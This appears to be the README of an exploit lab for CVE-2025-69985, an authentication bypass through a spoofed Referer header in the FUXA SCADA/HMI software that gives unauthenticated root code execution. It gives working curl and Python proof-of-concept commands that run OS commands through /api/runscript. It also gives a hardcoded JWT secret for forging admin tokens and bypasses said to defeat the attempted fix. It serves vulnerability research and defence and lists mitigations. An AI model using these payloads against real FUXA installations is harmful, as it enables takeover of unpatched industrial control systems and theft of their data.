# CVE-2025-69985 - FUXA Authentication Bypass to Remote Code Execution

> **Exploit Intelligence Platform** | [exploit-intel.com](https://exploit-intel.com) | [@exploit_intel](https://x.com/exploit_intel)

## Vulnerability Summary

| Field | Value |
|---|---|
| CVE | CVE-2025-69985 |
| Component | [FUXA](https://github.com/frangoteam/FUXA) |
| Type | CWE-288: Authentication Bypass Using an Alternate Path or Channel |
| CVSS | 9.8 (Critical) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| EPSS | 0.5% (67.2th percentile) |
| Affected | All versions ≤ 1.2.8 (through v1.2.11 / latest) |
| Fix | **None** — no patched version available |
| Author | Exploit Intelligence Platform |
| Date | 2026-02-28 |

## Vulnerability Details

FUXA versions 1.2.8 and prior contain a critical authentication bypass vulnerability in the `requireAuth` middleware (`server/api/jwt-helper.js`) that trusts the HTTP `Referer` header to validate internal requests. By spoofing this header, a remote unauthenticated attacker can bypass JWT authentication entirely and reach the `/api/runscript` endpoint, which compiles and executes arbitrary JavaScript via `Module._compile()` — resulting in full unauthenticated Remote Code Execution as root. This is an incomplete fix for CVE-2023-33831.

### Root Cause

The vulnerability resides in the `requireAuth` function in `server/api/jwt-helper.js`. This middleware is intended to enforce JWT authentication on protected API endpoints. However, before checking any JWT token, it inspects the HTTP `Referer` header and **immediately grants access** if the header matches certain patterns:

```javascript
function requireAuth (req, res, next) {
    const referer = req.headers.referer;
    if (referer) {
        const requestHost = req.headers.host;
        // BYPASS 1: Referer matches server's own host
        if (referer.startsWith(`http://${requestHost}`) || referer.startsWith(`https://${requestHost}`)) {
            return next();  // Skips all JWT verification
        }
        // BYPASS 2: Referer contains any of these substrings
        const fuxaPatterns = ['/fuxa', '/editor', '/viewer', '/lab', '/home',
            'localhost:', '127.0.0.1:', '0.0.0.0:'];
        if (fuxaPatterns.some(pattern => referer.includes(pattern))) {
            return next();  // Skips all JWT verification
        }
    }
    // JWT check only reached if Referer bypass fails
}
```

### Attack Chain

```
1. Spoof Referer header to match one of three bypass patterns
2. POST crafted JavaScript payload to /api/runscript
3. Server compiles code via runTestScript -> Module._compile()
4. Arbitrary OS command execution via child_process.execSync()
5. Command output returned in HTTP response — no reverse shell needed
```

Three bypass vectors exist:
1. **Host match** — `Referer: http://<target>:1881/anything` (matches `req.headers.host`)
2. **Path pattern** — `Referer: http://attacker.com/fuxa` (matches `/fuxa` substring from any origin)
3. **Localhost pattern** — `Referer: http://localhost:31337/` (matches `localhost:` substring)

Once authentication is bypassed, the `/api/runscript` endpoint accepts arbitrary JavaScript code via the `test` field. The code is compiled into a Node.js module using `Module._compile()` in `server/runtime/scripts/msm.js` and executed with full access to Node.js APIs, including `require('child_process').execSync()`. The official Docker image runs as root (uid=0), making this a full system-level compromise.

### Fix

**Status: NO PATCH AVAILABLE**

As of the latest release (v1.2.11), no fix exists for this vulnerability. The Referer bypass in `requireAuth` (lines 79–122 of `server/api/jwt-helper.js`) is identical across all versions from v1.2.8 through v1.2.11.

Additionally, our bypass analysis identified three independent attack vectors that survive the attempted fix commits (`37f9876f`, `4246c40a`, `5e7679b0`):

1. **JWT Token Forgery** (Critical) — The JWT signing secret defaults to `frangoteam751` (hardcoded in source). An attacker can forge admin JWTs and achieve RCE even with `secureEnabled=true`.
2. **Insecure Default** (Critical) — `secureEnabled` defaults to `false`, disabling all authentication entirely.
3. **Guest Pass-through** (Medium) — `verifyToken` middleware never rejects requests, leaking project data and server settings to unauthenticated guests.

**Recommended mitigations (until patched):**

- Do not expose FUXA to untrusted networks — restrict access via firewall rules or VPN
- Remove the Referer bypass from `requireAuth()` in `server/api/jwt-helper.js`
- Enable authentication — set `secureEnabled: true` in `_appdata/mysettings.json`
- Run as non-root — modify the Docker image to run as a non-privileged user
- Disable `/api/runscript` if script execution is not needed

## Lab Setup

### Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                        Host Machine                         │
│                                                             │
│   ┌────────────────────────────────────────────┐            │
│   │          Docker Network: lab-net           │            │
│   │                                            │            │
│   │   ┌────────────────────────────────────┐   │            │
│   │   │  cve-2025-69985-vulnerable         │   │            │
│   │   │  FUXA v1.2.8 (Node.js 18)         │   │            │
│   │   │  Port 1881 → Host :1881            │   │            │
│   │   │                                    │   │            │
│   │   │  /api/runscript ← RCE endpoint     │   │            │
│   │   │  requireAuth ← Referer bypass      │   │            │
│   │   └────────────────────────────────────┘   │            │
│   └────────────────────────────────────────────┘            │
│                                                             │
│   python3 poc/poc.py -t localhost -c "id" ──────► :1881     │
└─────────────────────────────────────────────────────────────┘
```

### Quick Start

```bash
cd CVE-2025-69985

# Build and start
docker compose build
docker compose up -d

# Run the exploit
python3 poc/poc.py -t localhost -c "id"

# Cleanup
docker compose down
```

### Container Details

| Container | Role | Base | Host Port | Description |
|---|---|---|---|---|
| `cve-2025-69985-vulnerable` | Vulnerable target | `frangoteam/fuxa:1.2.8` | `1881` | FUXA v1.2.8 SCADA/HMI with auth bypass |

### Default Credentials

| Service | Username | Password |
|---|---|---|
| FUXA | `admin` | *(created on first access — security disabled by default)* |

## PoC Usage

Three PoC scripts are provided, each demonstrating a different attack vector. All scripts use **Python 3 stdlib only** — no external dependencies.

### PoC 1: Authentication Bypass + RCE (`poc/poc.py`)

The primary PoC demonstrates all three Referer bypass methods to achieve unauthenticated RCE.

```bash
# Basic RCE — execute 'id' using the host-match bypass
python3 poc/poc.py -t localhost -c "id"

# Execute a custom command
python3 poc/poc.py -t localhost -c "uname -a && whoami"

# Use the cross-origin pattern bypass (most dangerous — works from any origin)
python3 poc/poc.py -t localhost -b pattern -c "cat /etc/passwd"

# Use the localhost pattern bypass
python3 poc/poc.py -t localhost -b local -c "ls -la /"

# Test ALL three bypass methods comprehensively
python3 poc/poc.py -t localhost --all-methods
```

### Expected Output (Vulnerable)

```
============================================================
  CVE-2025-69985: FUXA <= 1.2.8 Auth Bypass + RCE
  CWE-288: Authentication Bypass via Alternate Channel
============================================================
[*] Target: http://localhost:1881
[*] Bypass method: host
[*] Referer: http://localhost:1881/fuxa
[*] Command: id
[*] Sending POST /api/runscript ...
[*] HTTP Status: 200
[+] SUCCESS - Command executed via CVE-2025-69985!
[+] Auth bypass method: host

============================================================
  COMMAND OUTPUT
============================================================
uid=0(root) gid=0(root) groups=0(root)
============================================================
```

### PoC 2: Data Exfiltration (`poc/poc_vector2.py`)

Demonstrates unauthenticated access to SCADA/HMI project data and server settings.

```bash
python3 poc/poc_vector2.py -t localhost
```

### PoC 3: User Enumeration & Config Exposure (`poc/poc_vector3.py`)

Demonstrates unauthenticated user enumeration and admin-level access confirmation.

```bash
python3 poc/poc_vector3.py -t localhost
```

### Fix Bypass PoC (`poc/bypass_poc.py`)

Demonstrates three independent bypasses against the "patched" version (FUXA master, commit `427d2f63`):

```bash
# Test all three bypass vectors
python3 poc/bypass_poc.py localhost 1881 --bypass all -c "id"

# JWT forgery via hardcoded secret (requires secureEnabled=true)
python3 poc/bypass_poc.py localhost 1881 --bypass 1

# Insecure default config (requires secureEnabled=false)
python3 poc/bypass_poc.py localhost 1881 --bypass 2

# Info disclosure via guest pass-through
python3 poc/bypass_poc.py localhost 1881 --bypass 3
```

## Verification: Vulnerable vs Patched

### Auth Enforcement Proof

| Request | Referer Header | HTTP Status | Result |
|---------|---------------|-------------|--------|
| `POST /api/runscript` | *(none)* | **401** | `Authentication required!` |
| `POST /api/runscript` | `http://evil.com/nothing` | **401** | `Authentication required!` |
| `POST /api/runscript` | `http://<target>:1881/fuxa` | **200** | `uid=0(root) gid=0(root)` |
| `POST /api/runscript` | `http://attacker.com/fuxa` | **200** | `uid=0(root) gid=0(root)` |
| `POST /api/runscript` | `http://localhost:31337/` | **200** | `uid=0(root) gid=0(root)` |

### Bypass Status on Patched Version

| Bypass | Method | Patched Result |
|--------|--------|---------------|
| Bypass 1 | JWT forgery (hardcoded secret) | **BYPASSED** — RCE as root |
| Bypass 2 | Insecure default (`secureEnabled=false`) | **BYPASSED** — RCE as root |
| Bypass 3 | Guest pass-through (info disclosure) | **BYPASSED** — 3/4 endpoints exposed |

### Minimal curl Reproduction

```bash
# This should return 401 (auth enforced):
curl -s -o /dev/null -w "%{http_code}" -X POST "http://localhost:1881/api/runscript" \
  -H "Content-Type: application/json" \
  -d '{"params":{"script":{"test":true,"name":"e","code":"return 1","parameters":[]}}}'
# Output: 401

# This should return 200 with RCE output (auth bypassed):
curl -s -X POST "http://localhost:1881/api/runscript" \
  -H "Content-Type: application/json" \
  -H "Referer: http://localhost:1881/fuxa" \
  -d '{"params":{"script":{"test":true,"name":"exploit","code":"return require(\"child_process\").execSync(\"id\").toString()","parameters":[]}}}'
# Output: "uid=0(root) gid=0(root) groups=0(root)"
```

## Files

| File | Description |
|---|---|
| `poc/poc.py` | Primary PoC — auth bypass + RCE via all three Referer methods |
| `poc/poc_vector2.py` | Data exfiltration via `/api/project` and `/api/settings` |
| `poc/poc_vector3.py` | User enumeration and admin access confirmation |
| `poc/bypass_poc.py` | Fix bypass PoC — JWT forgery, insecure defaults, guest pass-through |
| `Dockerfile.vulnerable` | FUXA v1.2.8 vulnerable target container |
| `Dockerfile.patched` | FUXA master (commit `427d2f63`) with `secureEnabled=true` |
| `docker-compose.yml` | Lab orchestration — single-container setup |
| `appdata/mysettings.json` | FUXA settings with `secureEnabled: true` for auth bypass testing |

## References

- [NVD Entry](https://nvd.nist.gov/vuln/detail/CVE-2025-69985)
- [GitHub Security Advisory — GHSA-4r4r-4jp4-wwf9](https://github.com/advisories/GHSA-4r4r-4jp4-wwf9)
- [Vulnerability Writeup](https://gist.github.com/lihy10/8cb2dd65ebf1385f12a7e00e25a50d40)
- [Vulnerable Source Code](https://github.com/frangoteam/FUXA/blob/master/server/api/jwt-helper.js)
- [Public Exploit — joshuavanderpoll](https://github.com/joshuavanderpoll/CVE-2025-69985)
- [FUXA Repository](https://github.com/frangoteam/FUXA)
- [Docker Hub Image](https://hub.docker.com/r/frangoteam/fuxa)

### Related CVEs

| CVE | Description |
|---|---|
| [CVE-2023-33831](https://nvd.nist.gov/vuln/detail/CVE-2023-33831) | Original auth bypass + RCE in FUXA (of which this CVE is an incomplete fix) |

## Timeline

| Date | Event |
|---|---|
| 2023 | CVE-2023-33831 — original auth bypass + RCE in FUXA disclosed |
| 2023–2024 | Partial fixes applied (token refresh hardening, path validation) |
| 2026-02-24 | CVE-2025-69985 published — identifies the fix for CVE-2023-33831 as incomplete |
| 2026-02-24 | GHSA-4r4r-4jp4-wwf9 published (no patched version) |
| 2026-02-28 | Lab created and verified by Exploit Intelligence Platform |

## Disclaimer

This proof-of-concept is provided for **authorized security testing and educational purposes only**. It is intended to help defenders understand, detect, and remediate CVE-2025-69985 in their environments.

**Do not** use this tool against systems you do not own or have explicit written authorization to test. Unauthorized access to computer systems is illegal in most jurisdictions and may violate laws including the Computer Fraud and Abuse Act (CFAA), the Computer Misuse Act, and equivalent legislation worldwide.

The authors assume no liability for misuse of this material. This project follows responsible disclosure practices.
